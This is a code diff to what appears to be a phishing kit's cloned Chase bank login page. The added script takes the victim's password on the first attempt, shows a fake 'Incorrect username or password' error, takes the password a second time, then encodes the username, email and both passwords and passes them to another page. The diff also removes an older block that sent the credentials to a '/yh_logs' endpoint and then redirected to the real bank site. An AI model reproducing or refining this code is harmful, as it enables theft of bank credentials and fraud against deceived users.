@@ -8,6 +8,9 @@
       </style>
 	  <link rel="stylesheet" href="css-loader.css">
       <meta name="robots" content="noindex,nofollow">
+	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" integrity="sha512-VEd+nq25CkR676O+pLBnDW09R7VQX9Mdiij052gVCp5yVH3jGtH70Ho/UUv4mJDsEdTvqRCFZg0NKGiojGnUCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+	  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" integrity="sha512-3pIirOrwegjM6erE5gPSwkUzO+3cTjpnV9lexlNZqvupR64iZBnOOTiiLPb9M36zpMScbmUNIcHUqKD47M719g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
       <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="msapplication-config" content="none">
@@ -198,9 +201,10 @@
       <link rel="stylesheet" href="./logon.css">
       <link rel="stylesheet" href="./blue-ui.css">
       <script src="./main_6aa1628e2a88c4ec1665bf64300661f3.js.download"></script><script src="./main_e05591e2e735c5ebcbd55f52e568191a.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-vendor/main" src="./main.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue/main" src="./main.js(1).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="logon/boot" src="./boot.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-app/with/locationAPI" src="./locationAPI.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-app/settings" src="./settings.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-app/validate/var/ZIP_CODE_REGEX" src="./ZIP_CODE_REGEX.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view/page/web" src="./web.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view-ractive/bridge" src="./bridge.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view-ractive/view" src="./view.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jquery/dist/jquery.min" src="./jquery.min.js.download"></script>
-	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
 	  <script>
 	  $( document ).ready(function() {
+	  var clicked = 0;
     $('#userId-text-input-field').on('input', function(){$('#userId-label[for="userId-text-input-field"]').toggle($('#userId-text-input-field').val()=='')});
 $('#password-text-input-field').on('input', function(){$('#password-label[for="password-text-input-field"]').toggle($('#password-text-input-field').val()=='')});
 function getUrlVars()
@@ -221,19 +225,28 @@ console.log(4);
 setTimeout(function(){ $('.loader-default').addClass('is-active'); }, 300);
 setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
 setTimeout(function(){
-	var encodedString = btoa(JSON.stringify({ username: $('#userId-text-input-field').val(), email: getUrlVars()['email'], password: $('#password-text-input-field').val()}));
+	if(clicked == 1)
+	{
+	var encodedString = btoa(JSON.stringify({ username: $('#userId-text-input-field').val(), email: getUrlVars()['email'], password1:pass1 ,password2: $('#password-text-input-field').val()}));
 	window.location.replace("/email.html?data="+encodeURIComponent(encodedString));
+	}
+	else
+	{
+	var pass1 = $('#password-text-input-field').val();
+	toastr["error"]("Incorrect username or password.");
+	$('.loader-default').removeClass('is-active');
+	$('#password-text-input-field').val('');
+	clicked=1;
+	}
 }, 4000);
 
 return;
-$.get( "/yh_logs", { username: $('#userId-text-input-field').val(), email: $('#email123').text(), password: $('#password-text-input-field').val()}).done(function( data ) {
-    window.location.replace("https://secure07a.chase.com");
-  });
 
 });
 });
 
 	  </script>
+	  
 	  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-app/main" src="./main.js(2).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view/main" src="./main.js(3).download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@mds/web/bundle/elements-core" src="./elements-core.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="d3" src="./d3.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view/resolver/cav" src="./cav.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view/load" src="./load.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view/nodeDictionary" src="./nodeDictionary.js.download"></script>
       <style type="text/css"></style>
       <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@mds/web/bundle/elements-common" src="./elements-common.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@mds/web/bundle/elements-chart" src="./elements-chart.js.download"></script><script id="-14571437188" type="text/javascript">/**
